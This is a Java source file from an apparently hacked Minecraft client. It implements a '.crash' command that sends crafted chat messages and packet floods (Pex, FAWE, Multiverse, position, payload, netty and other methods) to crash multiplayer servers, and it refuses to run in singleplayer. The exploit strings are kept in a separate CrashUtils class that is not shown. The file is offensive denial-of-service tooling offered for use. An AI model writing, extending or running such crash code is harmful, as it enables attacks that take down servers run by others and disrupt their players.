package cn.loli.client.command.commands;

import cn.loli.client.Main;
import cn.loli.client.command.Command;
import cn.loli.client.notifications.Notification;
import cn.loli.client.notifications.NotificationManager;
import cn.loli.client.notifications.NotificationType;
import cn.loli.client.utils.ChatUtils;
import cn.loli.client.utils.CrashUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C01PacketChatMessage;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class CrashCommand extends Command {

    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "PayLoad", "Netty"};
    CrashUtils crashUtils = new CrashUtils();

    int bookType, bookvalue, redo, resolvebyte;
    boolean setTag;

    public CrashCommand() {
        super("crash", "c", "crash");
    }

    @Override
    public void run(String alias, @NotNull String[] args) {
        if (args.length < 1) {
            NotificationManager.show(new Notification(NotificationType.INFO, "Crasher", "Usage: ." + alias + " method_name/list <amount> delay(ms)", 1));
            return;
        }

        int amounts = 5;
        String CrashType = args[0];

        if (args.length > 1)
            amounts = Integer.parseInt(args[1]);

        int value = amounts;


        if (Minecraft.getMinecraft().isSingleplayer()) {
            NotificationManager.show(new Notification(NotificationType.ERROR, "Crasher", "You are in Single Game!", 1));
        } else {
            try {
                Main.INSTANCE.timing = args.length > 2 ? Long.parseLong(args[2]) : 100L;

                if (args.length > 5) {
                    bookType = Integer.parseInt(args[3]);
                    bookvalue = Integer.parseInt(args[4]);
                    redo = Integer.parseInt(args[5]);
                    if (args.length > 7) {
                        resolvebyte = Integer.parseInt(args[6]);
                        setTag = Integer.parseInt(args[7]) == 0;
                    } else {
                        resolvebyte = 1;
                        setTag = false;
                    }
                } else {
                    bookType = 0;
                    bookvalue = 800;
                    redo = 5;
                    resolvebyte = 1;
                    setTag = false;
                }


                Main.INSTANCE.packetQueue.clear();

                ChatUtils.info(bookType + " " + bookvalue + " " + redo + " " + resolvebyte + " " + setTag + " ");

                switch (CrashType.toLowerCase()) {
                    case "pex": //Pex (outdated)
                        sendPacket(new C01PacketChatMessage(crashUtils.pexcrashexp1));
                        sendPacket(new C01PacketChatMessage(crashUtils.pexcrashexp2));
                        break;
                    case "fawe": //Old Fawe  (outdated)
                        sendPacket(new C01PacketChatMessage(crashUtils.fawe));
                        break;
                    case "mv": //Mv (outdated)
                        sendPacket(new C01PacketChatMessage(crashUtils.mv));
                        break;
                    case "position":
                        crashUtils.custombyte(value);
                        break;
                    case "payload":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, 833, 1, false, CrashUtils.CrashType.PAYLOAD1, amounts, false, 1);
                        break;
                    case "payload2":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PAYLOAD2, amounts, setTag, resolvebyte);
                        break;
                    case "place":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.PLACE, amounts, setTag, resolvebyte);
                        break;
                    case "click":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CLICK, amounts, setTag, resolvebyte);
                        break;
                    case "create":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CREATE, amounts, setTag, resolvebyte);
                        break;
                    case "cap":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, false, CrashUtils.CrashType.CAP, amounts, setTag, resolvebyte);
                        break;
                    case "netty":
                        crashUtils.crashdemo(crashUtils.netty, 0, 0, 12, true, CrashUtils.CrashType.CLICK, amounts, setTag, resolvebyte);
                        break;
                    case "action":
                        crashUtils.actioncrash(amounts);
                        break;
                    case "list":
                        ChatUtils.send(Arrays.toString(crashType));
                        break;
                    default:
                        ChatUtils.send("Couldn't Find the Crash Type");
                }
                NotificationManager.show(new Notification(NotificationType.INFO, "Crasher", "Success Added Methods to Queue" + " " + CrashType, 1));
            } catch (Throwable ignore) {
                NotificationManager.show(new Notification(NotificationType.ERROR, "Crasher", "Throw a error When you do" + " " + CrashType, 1));
            }
        }

    }

    @Override
    public List<String> autoComplete(int arg, String[] args) {
        String prefix = "";
        boolean flag = false;

        try {
            if (arg == 0) {
                flag = true;
            } else if (arg == 1) {
                flag = true;
            }
        } catch (Exception e) {
            // TODO: handle exception
        }

        ArrayList<String> crashtype = new ArrayList<>(Arrays.asList(crashType));

        if (flag) {
            return crashtype;
        } else return new ArrayList<>();
    }

    private void sendPacket(Packet<?> packet) {
        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(packet);
    }
}
